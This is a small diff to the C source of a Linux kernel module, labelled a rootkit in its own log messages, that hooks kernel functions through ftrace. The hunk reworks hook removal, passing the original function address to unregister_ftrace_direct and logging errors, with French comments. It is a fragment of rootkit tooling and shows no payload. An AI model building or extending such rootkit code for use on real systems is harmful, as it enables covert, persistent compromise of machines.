@@ -41,10 +41,15 @@ int install_hook(struct ftrace_hook *hook) {
 }
 
 void remove_hook(struct ftrace_hook *hook) {
-    // On désenregistre en repassant la même adresse
-    unregister_ftrace_direct(&hook->ops, (unsigned long)hook->function);
-    pr_info("rootkit: direct hook removed for %s\n", hook->name);
+    // On désenregistre en repassant l'adresse de la fonction d'origine
+    int err = unregister_ftrace_direct(&hook->ops, (unsigned long)hook->function, hook->address);
+    if (err) {
+        pr_err("rootkit: unregister_ftrace_direct failed for %s: %d\n", hook->name, err);
+    } else {
+        pr_info("rootkit: direct hook removed for %s\n", hook->name);
+    }
 }
+
 
 int install_hooks(struct ftrace_hook *hooks, size_t count) {
     int err;
